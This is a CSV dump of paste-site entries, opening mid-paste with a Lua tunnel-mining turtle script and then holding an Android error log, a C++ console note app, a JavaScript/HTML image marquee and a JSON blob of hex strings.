id,title,username,language,date,content
  end
  -- e por fim ajusta Y
  while y > 0 do downSafe() end
  while y < 0 do upSafe() end

  print(string.format(""🏁 Chegou! Coordenadas: (0,0,0), direção inicial: %s"", directions[1 + tonumber(arg[2] or 0)]))
end

-- --- Início da execução ---
-- O usuário deve SE POSICIONAR onde quer que seja o ponto 0,0,0
-- e VIRAR para a direção que deseja minerar.
local initialDir = dir
print(string.format(""▶ Iniciando túnel 2×1 de %d blocos"", length))
print(string.format(""📍 Ponto inicial registrado em (0,0,0), direção: %s"", directions[1 + dir]))

-- Faz o túnel
for i = 1, length do
  digTunnel2x1()
end

-- Retorna
returnToStart()
"
X2GaJvPZ,2025-05-28T15:28:42.656844,powerampache,PHP,Wednesday 28th of May 2025 08:28:43 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Failed to connect to localhost/127.0.0.1:80"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Failed to connect to localhost/127.0.0.1:80\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Failed to connect to localhost/127.0.0.1:80\"" }"",""stackTrace"":[]}"
AZT2T3aj,vector_todo.cpp,DrAungWinHtut,C++,Wednesday 28th of May 2025 08:27:48 AM CDT,"
#include <iostream>
#include <fstream>
#include <string>
#include<stdlib.h>
#include<vector>

std::vector<std::string> notes; // Vector to store notes
int noteCount = 0;

// Add new note
void addNote() {
    std::string note;
    std::cout << ""Enter new note: "";
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    getline(std::cin, note);
	if (note.empty()) {
		std::cout << ""Note cannot be empty.\n"";
		return;
	}	
    notes.push_back(note); // Store the note in the vector
    noteCount++;
    std::cout << ""Note added.\n"";
}


// Review all notes
void reviewNotes() {
    if (noteCount == 0) {
        std::cout << ""No notes to show.\n"";
        return;
    }
    for (int i = 0; i < notes.size(); i++) {
        std::cout << i + 1 << "". "" << notes[i] << ""\n"";
    }
}


// Edit a note
void editNote() {
    reviewNotes();
    std::cout << ""Enter note number to edit: "";
    int index;
    std::cin >> index;
    if (index < 1 || index > noteCount) {
        std::cout << ""Invalid note number.\n"";
        return;
    }
    std::cout << ""Enter new content: "";
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    getline(std::cin, notes[index - 1]);
    std::cout << ""Note updated.\n"";
}


// Delete a note
void deleteNote() {
    if (noteCount == 0) {
        std::cout << ""No notes to delete.\n"";
        return;
    }
    reviewNotes();
    std::cout << ""Enter note number to delete: "";

    int index;
    std::cin >> index;

    if ( index < 1 || index > noteCount) {
		std::cout << ""Invalid note number.\n"";
        return;
    }
	notes.erase(notes.begin() + index - 1); // Remove the note from the vector
    noteCount = noteCount - 1;
    std::cout << ""Note deleted.\n"";

}



// Main menu
int main() {
    int choice;
    do {
		system(""cls""); // Clear the console
		std::cout << ""--- NOTE TAKING APP ---\n"";
        std::cout << ""1. New Note\n"";
        std::cout << ""2. Review Notes\n"";
        std::cout << ""3. Edit Note\n"";
        std::cout << ""4. Delete Note\n"";
        std::cout << ""0. Exit\n"";
        std::cout << ""Choose an option: "";
        std::cin >> choice;

        system(""cls""); // Clear the console
        switch (choice) {
        case 1: addNote(); break;
        case 2: reviewNotes(); break;
        case 3: editNote(); break;
        case 4: deleteNote(); break;
        case 0: std::cout << ""Goodbye!\n""; break;
        default: std::cout << ""Invalid choice.\n""; break;
        }
		system(""pause""); // Pause the console to see the output
    } while (choice != 0);
    return 0;
}"
mJGg95Us,Marquee-JS,dugalcedo,JavaScript,Wednesday 28th of May 2025 07:34:23 AM CDT,"
function createInfiniteImageMarquee(selector, options = {}) {
    // Find parent element
    const parentElement = document.querySelector(selector)

    // default options
    const {
        height = ""200px"",
        gap = 0,
        speed = 2000
    } = options

    // parent styles
    parentElement.style.maxWidth = '100%'
    parentElement.style.overflowX = 'hidden'
    parentElement.style.minHeight = height
    parentElement.style.position = 'relative'

    // get image elements and urls
    const images = [...parentElement.querySelectorAll(':scope > img')]
    const urls = images.map(img => img.src)

    const length = images.length
    const imgWidth = 100/(length-1)

    // delete contents
    parentElement.innerHTML = """"

    const createImg = (i, start = i) => {
        // Define element and attributes
        const img = document.createElement('img')
        img.classList.add('marquee-img')
        const url = urls[i]
        img.src = url

        // Styles
        img.style.height = height
        img.style.width = imgWidth + ""%""
        img.style.objectFit = ""cover""
        img.style.position = 'absolute'
        img.style.top = '0px'
        const leftMargin = gap * start
        img.style.left = `calc(${(imgWidth*start) + '%'} + ${leftMargin}px)`
        const transition = speed * (start+1)
        img.style.transition = transition + 'ms linear'
    
        // append to parent
        parentElement.append(img)

        // move
        requestAnimationFrame(() => {
            // Simply accessing this property forces the browser to re-register the image's position?
            // I'm not sure why
            img.offsetWidth

            img.style.left = (-imgWidth) + '%'
            setTimeout(() => {
                createImg(i, length-1)
                img.remove()
            }, transition);
        })
    }

    // start
    for (let i = 0; i < length; i++) {
        createImg(i)
    }
}


// TEST
createInfiniteImageMarquee('.image-marquee', {
    height: '300px',
    gap: 20
})"
7y2f0W0Y,Marquee-HTML,dugalcedo,HTML,Wednesday 28th of May 2025 07:33:20 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Document</title>
    <script src=""./script.js"" defer></script>
    <style>
        .marquee-img {
            border-radius: 15px;
            box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.4);
        }
    </style>
</head>
<body>
    <div class=""image-marquee"">
        <img src=""https://picsum.photos/seed/i0/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i1/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i2/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i3/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i4/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i5/500/500"" alt=""random image"">
        <img src=""https://picsum.photos/seed/i6/500/500"" alt=""random image"">
    </div>
</body>
</html>"
SxJWFUhd,dataNone,TestGuy1,JSON,Wednesday 28th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a4c53c265baac866754d72c125fd9f3826fc48aba8dda01f98e37cabf3434024f8d5d7696190f7c8454645d20639eb3fc498fae719547701e72217d3a6138e8d98702a71c87d3144cd0471086fd73593f1820869a24bd7a850c8fd0e2f2c4b8ea96272d3dbb934c96bfb5d9427e78e1bf9d6b419d78ae41abb79d19d222a26cd',
  otherdata: [
    '1d910cd517546cba9209d95d23640e44',
    '0a8663c51450ab41611beb69f60c3a0f',
    'ff036f3d39d2026ebd7997a207117385',
    'a6cd32ee8b081c4a5b02116c16e147cc',
    '21d781c71e80238fa3680b359d3e14fe',
    'b84fb525158a86032787b6a9f53de99b',
    '03b89c2128bed6f04f1f380e8d9754fc',
    '343bb65572668e10a1dfb27daaa422a5'
  ]
}"
